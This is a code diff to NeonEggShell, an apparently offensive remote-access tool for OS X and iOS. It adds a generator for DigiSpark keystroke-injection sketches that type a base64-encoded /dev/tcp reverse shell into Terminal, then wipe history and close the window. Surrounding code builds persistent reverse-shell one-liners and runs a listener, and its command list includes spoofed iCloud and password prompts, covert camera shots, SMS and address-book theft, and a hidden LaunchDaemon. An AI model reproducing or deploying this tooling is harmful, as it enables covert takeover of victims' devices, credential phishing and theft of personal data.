@@ -25,7 +25,7 @@ def banner():
 |  |\    | |  .--' .-._)   \ 
 |  | \   | |  `---.\       / 
 `--'  `--' `------' `-----' """			
-	print WHITE + "    [Beta Version 1.7.1]"
+	print WHITE + "    [Version 1.8]"
 	print RED + "  Created by NeonEggplant" + GREEN
 	print "\nNeonEggShell, OS X and iOS command shell"
 	print WHITE + "For pentesting only, I am not responsable\nfor any damage you may cause" + GREEN
@@ -34,14 +34,12 @@ def banner():
 	print "      1): Start server"
 	print "      2): Create Shell Script payload"
 	print "      3): Create Cydia Deb File payload"
-	print "      4): How to/About"
-	print "      5): Exit"
+	print "      4): Create Arduino based payload"
+	print "      5): How to/About"
+	print "      6): Exit"
 	print WHITE + "-" * 45
 
-#gets our current ip
-def getip():
-	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);s.connect(("192.168.1.1",80));host = s.getsockname()[0];s.close()
-	return host
+
 
 #main
 def begin(err):
@@ -82,7 +80,7 @@ def begin(err):
 			setpersistent = True
 		else:
 			setpersistent = False
-		print INFO+"[*]  " + WHITE + "Job=>"+str(setpersistent)
+		print INFO+"[*]  " + WHITE + "background=>"+str(setpersistent)
 		createshellscript(str(host),str(port),setpersistent)
 	elif option=="3":
 		print INFO+"[*]  "+WHITE+"Preparing Deb File"
@@ -96,6 +94,25 @@ def begin(err):
 		print INFO+"[*]  " + WHITE + "LPORT=>"+str(port)
 		createdebfile(str(host),str(port))
 	elif option=="4":
+		print INFO+"[*]  "+WHITE+"Please Select a Device\n\n     1): Arduino/Teensy\n     2): DigiSpark\n"
+		option = raw_input(NES + "device: ")
+		sethost = raw_input(NES+"SET LHOST (Leave blank for "+host+"):")
+		if sethost!="":
+			host = sethost
+		print INFO+"[*]  " + WHITE + "LHOST=>"+host
+		setport = raw_input(NES+"SET LPORT (Leave blank for "+str(port)+"):")
+		if setport!="":
+			port=setport
+		print INFO+"[*]  " + WHITE + "LPORT=>"+str(port)
+		setpersistent = raw_input(NES+"Make it a background job? (reconnect after exit)(y/N):")
+		if str(setpersistent).lower()=="y":
+			setpersistent = True
+		else:
+			setpersistent = False
+		print INFO+"[*]  " + WHITE + "background=>"+str(setpersistent)
+		createino(option,str(host),str(port),setpersistent)
+		startserverprompt(host,port)
+	elif option=="5":
 		os.system("clear")
 		print INFO+"""   .--.  ,---.    .---.  .-. .-. _______ 
  / /\ \ | .-.\  / .-. ) | | | ||__   __|
@@ -143,30 +160,75 @@ execute commands              """+INFO+" <---"+WHITE+"""                     sen
   		begin(1)
  
 		
-	elif option=="5":
+	elif option=="6":
 		print ENDC
 		exit()
 	else:
 		begin(option)
-
+		
+#gets our current ip
+def getip():
+	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);s.connect(("192.168.1.1",80));host = s.getsockname()[0];s.close()
+	return host
 #prompt user if they want to start the server
 def startserverprompt(host,port):
 	listenop = raw_input(NES+"Start Server? (Y/n): ")
 	if listenop == "n":
 		begin(1)		
-	startserver(host,port)
+	startserver(str(host),str(port))
 	
-#CREATE PAYLOADS
+#GENERATE BASE64 PAYLOAD
 def createshellscript(host,port,ispersistent):
 	payload=''
 	if ispersistent:
 		payload=base64.b64encode("while true; do cat </dev/tcp/"+host+"/"+port+" | sh; sleep 5; done & exit")
 	else:
 		payload=base64.b64encode("cat </dev/tcp/"+host+"/"+port+" | sh & exit")
-	print INFO+"[*]  "+WHITE + "Creating Payload... (run on target machine)"
+	print INFO+"[*]  "+WHITE + "Creating Payload..."
 	
 	print INFO + "echo "+payload+" | base64 --decode | bash >/dev/null 2>&1"+ENDC
-	startserverprompt(host,port)
+	startserverprompt(host,int(port))
+
+#createArduino .ino file
+def createino(option,host,port,ispersistent):
+	if int(option) == 1:
+		print "not supported yet"
+		exit()
+	elif int(option) == 2:
+		payload=''
+		if ispersistent:
+			payload=base64.b64encode("while true; do cat </dev/tcp/"+host+"/"+port+" | sh; sleep 5; done & exit")
+		else:
+			payload=base64.b64encode("cat </dev/tcp/"+str(host)+"/"+str(port)+" | sh & exit")
+		payload = "echo "+payload+" | base64 --decode | bash >/dev/null 2>&1"+ENDC
+	
+		print INFO+"[*]  " + WHITE + "writing to output/digispark_injector.ino"
+		time.sleep(0.2)		
+		if not os.path.isdir("output"):
+			os.makedirs("output")
+		with open("output/digispark_injector.ino","w") as f:
+			f.write("""//Created with NeonEggShell by neoneggplant
+#include <DigiKeyboard.h>
+const int pin = 1;//default onboard led pin
+void setup() {
+  pinMode(1,OUTPUT); //we are going to control this pin
+  DigiKeyboard.sendKeyStroke(KEY_W, MOD_GUI_LEFT);//bypass "Keyboard Setup" prompt
+  delay(ds);
+  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);//open spotlight
+  delay(ds);
+  DigiKeyboard.println("Terminal");//open terminal
+  delay(4000);  
+  DigiKeyboard.println("""+"\""+payload+""";history -wc;killall Terminal;"); //execute payload, clear history, close terminal
+}
+void loop() {
+  //blink when done
+  digitalWrite(1,HIGH);
+  delay(200);
+  digitalWrite(1,LOW);
+  delay(200);
+}
+""")
+		
 
 #create deb file, must have dpkg installed
 def createdebfile(host,port):
@@ -225,12 +287,13 @@ launchctl load /Library/LaunchDaemons/.sysinfo.plist
 #start the server
 def startserver(host,port):
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1);s.bind(('', int(port)));s.listen(1) 
-	print INFO+"[*]  "+WHITE+"Starting Reverse Handler on "+port+"..."
+	print INFO+"[*]  "+WHITE+"Starting Reverse Handler on "+str(port)+"..."
 	conn, addr = s.accept() #wait to connect to a host
 	print INFO+"[*]  "+WHITE+"Connecting to "+addr[0]
 	injectpayload(host,port,conn,s) #start eggshell
 	
 def injectpayload(host,port,conn,s):	
+	int(port)
 	#first we test the water with a script that will send the processor, sleep 1, then execute whatever else is sent to it
 	conn.send("sleep 0.5;arch >/dev/tcp/"+host+"/"+port+";sleep 1;cat </dev/tcp/"+host+"/"+port+" | sh\n") 
 	conn.close();conn,addr=s.accept()
@@ -347,9 +410,7 @@ def interactiveshell(name,conn,s,settings):
 							cmd="rm /usr/bin/.sys; launchctl unload /Library/LaunchDaemons/.sysinfo.plist; rm /Library/LaunchDaemons/.sysinfo.plist"
 					else:
 						print WHITE+"Usage: launchd install/uninstall";
-						continue
-
-					
+						continue					
 			#universal
 			if cmd.split()[0] == "lls":
 				if len(cmd.split()) == 1:
@@ -368,20 +429,6 @@ def interactiveshell(name,conn,s,settings):
 					option=1
 				else:
 					cmd="download"
-			
-			elif cmd.split()[0] == "upload":
-				if len(cmd.split()) != 2:
-					print "Usage: upload file.jpg"
-					continue
-				else:
-					filename = cmd.split()[1] #filename
-					filedata = open(filename).read() #
-
-					if "/" in filename: #save file as the last array of characters after / if file is in another directory
-						filename=filename.split('/')[-1]
-					
-					cmd = "upload" + " " + base64.b64encode(filename) + " " + "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"#base64.b64encode(filedata).replace("\n","")
-					print cmd
 			elif cmd == "lpwd":
 				os.system('pwd')
 				continue
@@ -405,11 +452,13 @@ def interactiveshell(name,conn,s,settings):
 				time.sleep(0.2)
 				print "\n "+WHITE+ WHITEBU + "NES Commands\n" + ENDC
 				print " " + RED + "download"+WHITE+"  - usage: download file.jpg"
-				print " " + RED + "upload"+WHITE+"    - usage: upload file.jpg"
 				print " " + RED + "sysinfo"+WHITE+"   - get current machine user and name"
 				print " " + RED + "ip"+WHITE+"        - view ip"
 				print " " + RED + "ls"+WHITE+"        - list contents of current directory"
 				print " " + RED + "cd"+WHITE+"        - change directory"
+				print " " + RED + "mkdir"+WHITE+"     - create directory"
+				print " " + RED + "rmdir"+WHITE+"     - remove directory"
+
 				if settings == 1:
 					#OSX NES Specials 
 					print " " + RED + "mute"+WHITE+"      - OSX mute audio output"
@@ -421,11 +470,13 @@ def interactiveshell(name,conn,s,settings):
 					print " " + RED + "itpause"+WHITE+"   - OSX iTunes pause "
 					print " " + RED + "itnext"+WHITE+"    - OSX iTunes next track"
 					print " " + RED + "itprev"+WHITE+"    - OSX iTunes previous track"
-					print " " + RED + "imessage"+WHITE+"  - OSX send message through messages.app"
+					print " " + RED + "imessage"+WHITE+"  - OSX send message with current imessage account"
 					print " " + RED + "screenshot"+WHITE+"- OSX take screenshot"
 					print " " + RED + "camshot"+WHITE+"   - OSX take picture with isight camera"
 					print " " + RED + "prompt"+WHITE+"    - OSX password prompt spoof"
-					print " " + RED + "brightness"+WHITE+"- OSX set brightness\n"
+					print " " + RED + "brightness"+WHITE+"- OSX set brightness"
+					print " " + RED + "getpaste"+WHITE+"  - OSX get string from clipboard\n"
+
 				elif settings == 2:
 					#IOS NES Specials 
 					print " " + RED + "flash"+WHITE+"     - iOS turn on flash for -t (seconds)"
@@ -447,6 +498,9 @@ def interactiveshell(name,conn,s,settings):
 					print " " + RED + "doublehome"+WHITE+"- iOS simulate doublepress home button"
 					print " " + RED + "play"+WHITE+"      - iOS media control play"
 					print " " + RED + "pause"+WHITE+"     - iOS media control pause"
+					print " " + RED + "prev"+WHITE+"      - iOS media control previous track"
+					print " " + RED + "next"+WHITE+"      - iOS media control next track"
+					print " " + RED + "isplaying"+WHITE+" - iOS media control is playing?"
 					print " " + RED + "prompt"+WHITE+"    - iOS spoof icloud password prompt"
 					print " " + RED + "getsms"+WHITE+"    - iOS download the sms database"
 					print " " + RED + "getaddbook"+WHITE+"- iOS download the addressbook database"
@@ -464,5 +518,5 @@ def interactiveshell(name,conn,s,settings):
 			cmd="null"
 		getdata(cmd,option)
 		
-#run script
+#begin
 begin(1)
